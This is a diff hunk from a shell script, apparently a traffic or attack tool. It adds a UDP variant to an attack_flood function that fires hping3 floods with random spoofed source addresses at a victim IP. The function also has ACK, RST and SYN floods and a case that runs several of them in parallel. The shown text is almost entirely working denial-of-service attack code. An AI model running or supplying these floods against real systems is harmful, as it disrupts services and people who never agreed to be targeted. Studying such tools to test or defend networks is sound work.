@@ -124,10 +124,13 @@ attack_flood() {
             hping3 --rand-source -c $PKTS --faster -p ++80 -L 0 -M 0 -b -R "$VICTIM_IP" ;;
         "flood-ack")
             hping3 --rand-source -c $PKTS --faster -p ++80 -L 0 -A "$VICTIM_IP"         ;;
+        "flood-udp")
+            hping3 --rand-source -c $PKTS --faster -p ++80 --udp "$VICTIM_IP"         ;;
         "floods")
             #TODO need to run all of them in paralel
             hping3 --rand-source -c $PKTS --faster -p ++80 -L 0 -A "$VICTIM_IP" &
             hping3 --rand-source -c $PKTS --faster -p ++80 -L 0 -M 0 -b -R "$VICTIM_IP" &
+            hping3 --rand-source -c $PKTS --faster -p ++80 --udp "$VICTIM_IP" &
             hping3 --rand-source -c $PKTS --faster -p ++80 -L 0 -S "$VICTIM_IP"
             ;;
     esac
